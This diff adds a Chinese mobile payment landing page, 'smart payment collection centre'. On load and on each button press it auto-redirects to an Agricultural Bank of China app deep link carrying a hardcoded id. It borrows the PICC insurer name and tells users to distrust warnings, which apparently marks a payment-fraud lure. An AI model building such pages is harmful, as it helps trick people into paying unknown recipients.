@@ -1,0 +1,300 @@
+
+
+<!DOCTYPE html >
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8"/>
+    <title>智能收款中心</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <style>
+        * {
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, "PingFang SC", "Segoe UI";
+        }
+
+        body {
+            margin: 0;
+            min-height: 100vh;
+            background: linear-gradient(180deg, #eaf2ff, #f6f9ff);
+            color: #1f2937;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 420px;
+            padding: 20px 16px 40px;
+        }
+
+        .card {
+            background: rgba(255, 255, 255, .7);
+            border-radius: 18px;
+            padding: 18px;
+            margin-bottom: 16px;
+            backdrop-filter: blur(12px);
+            box-shadow: 0 8px 30px rgba(30, 64, 175, .12),
+            inset 0 0 0 1px rgba(255, 255, 255, .6);
+        }
+
+        .header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .tag {
+            background: rgba(59, 130, 246, .1);
+            color: #2563eb;
+            padding: 6px 14px;
+            border-radius: 999px;
+            font-size: 13px;
+            font-weight: 600;
+        }
+
+        .mode {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+
+        .dot {
+            width: 8px;
+            height: 8px;
+            background: #22c55e;
+            border-radius: 50%;
+        }
+
+        .amount-title {
+            margin-top: 14px;
+            font-size: 14px;
+            color: #6b7280;
+        }
+
+        .amount {
+            margin-top: 6px;
+            font-size: 38px;
+            font-weight: 700;
+            color: #111827;
+        }
+
+        .status-title {
+            font-size: 22px;
+            font-weight: 700;
+            margin-bottom: 10px;
+        }
+
+        .status-desc {
+            font-size: 14px;
+            line-height: 1.7;
+            color: #4b5563;
+        }
+
+        .info-row {
+            display: flex;
+            justify-content: space-between;
+            margin: 8px 0;
+            font-size: 14px;
+        }
+
+        .info-row span:last-child {
+            font-weight: 600;
+        }
+
+        .steps {
+            display: flex;
+            gap: 12px;
+        }
+
+        .step {
+            flex: 1;
+            background: rgba(59, 130, 246, .08);
+            border-radius: 14px;
+            padding: 14px 10px;
+            text-align: center;
+        }
+
+        .step.active {
+            background: linear-gradient(90deg, #e0f2fe, #eef2ff);
+            color: #2563eb; /* 建议把按钮文字改深蓝 */
+        }
+
+        .step-num {
+            font-size: 18px;
+            font-weight: 700;
+        }
+
+        .step-text {
+            font-size: 13px;
+            margin-top: 4px;
+        }
+
+        .pay-btn {
+            margin-top: 20px;
+            width: 100%;
+            height: 56px;
+            border-radius: 18px;
+            border: none;
+            font-size: 18px;
+            font-weight: 700;
+            background: linear-gradient(90deg, #7dd3fc, #93c5fd);
+            color: #0f172a;
+            box-shadow: 0 8px 20px rgba(125, 211, 252, .45);
+            cursor: pointer;
+            /*box-shadow: 0 10px 25px rgba(59, 130, 246, .35);*/
+        }
+
+        .pay-btn:active {
+            transform: scale(.98);
+        }
+        .pay-btn.processing {
+            background: linear-gradient(90deg, #a3d5f7, #b0d4f9);
+            opacity: 0.7;
+            cursor: not-allowed;
+        }
+        /* loading */
+        .loading {
+            position: fixed;
+            inset: 0;
+            background: rgba(255, 255, 255, .85);
+            display: none;
+            align-items: center;
+            justify-content: center;
+            flex-direction: column;
+            z-index: 99;
+        }
+
+        .spinner {
+            width: 40px;
+            height: 40px;
+            border: 4px solid #c7d2fe;
+            border-top-color: #2563eb;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            to {
+                transform: rotate(360deg);
+            }
+        }
+
+        .footer {
+            margin-top: 18px;
+            text-align: center;
+            font-size: 12px;
+            color: #6b7280;
+            line-height: 1.6;
+        }
+    </style>
+</head>
+
+<body>
+<div class="container">
+
+    <div class="card">
+        <div class="header">
+            <div class="tag">智能收款中心</div>
+            <div class="tag mode">
+                <div class="dot"></div>
+                跳转模式
+            </div>
+        </div>
+
+        <div class="amount-title">订单金额</div>
+        <div class="amount"></div>
+    </div>
+
+    <div class="card">
+        <div class="status-title">正在为您准备支付</div>
+        <div class="status-desc">
+            系统已发起调起请求，如暂未唤起，<br>
+            可稍候或点击下方「立即支付」再次尝试。
+        </div>
+    </div>
+
+    <div class="card">
+        <div class="info-row"><span>安全支付</span><span>已保障</span></div>
+        <div class="info-row"><span>处理状态</span><span style="color:#16a34a">处理中</span></div>
+        <div class="info-row"><span>模式</span><span>快捷跳转</span></div>
+        <div class="info-row"><span>设备</span><span id="device">识别中...</span></div>
+    </div>
+
+    <div class="card">
+        <div class="steps">
+            <div class="step active">
+                <div class="step-num">1</div>
+                <div class="step-text">确认订单</div>
+            </div>
+            <div class="step active">
+                <div class="step-num">2</div>
+                <div class="step-text">系统调起</div>
+            </div>
+            <div class="step">
+                <div class="step-num">3</div>
+                <div class="step-text">完成支付</div>
+            </div>
+        </div>
+    </div>
+
+    <button class="pay-btn" onclick="pay()" id="payButton">立即支付</button>
+
+    <div class="footer">
+        此订单由人民保险 PICC 承保<br>
+        请勿相信要求您离开本页面的任何提示
+    </div>
+</div>
+<!-- loading -->
+<div class="loading" id="loading">
+    <div class="spinner"></div>
+    <div style="margin-top:10px">支付处理中...</div>
+</div>
+
+<script>
+    window.onload = function () {
+        redirectToUrl()
+    };
+
+    function getDevice() {
+        const ua = navigator.userAgent.toLowerCase();
+        if (ua.includes('android')) return 'Android';
+        if (ua.includes('iphone') || ua.includes('ipad')) return 'iOS';
+        return 'PC / 其他';
+    }
+
+    document.getElementById('device').innerText = getDevice();
+
+    function pay() {
+        const button = document.getElementById('payButton');
+
+        // 添加点击时的视觉反馈
+        button.classList.add('processing');
+        button.textContent = '支付中...';
+        button.disabled = true;
+
+        try {
+            redirectToUrl();
+        } finally {
+            // 恢复按钮状态
+            setTimeout(() => {
+                button.classList.remove('processing');
+                button.textContent = '立即支付';
+                button.disabled = false;
+            }, 1000); // 1秒后恢复按钮状态
+        }
+    }
+
+    function loading(bol) {
+        document.getElementById('loading').style.display = bol ? 'flex' : 'none';
+    }
+
+    function redirectToUrl() {
+        var bankUrl = 'bankabc%3A%2F%2Fplatformapi%2Fstarth5%3Furl%3Dhttps%253A%252F%252Fwww.abchina.com%252Fabcpay%257C17788019353408948826%252C5211';
+        window.location.href = decodeURIComponent(bankUrl);
+    }
+</script>
+
+</body>
+</html>
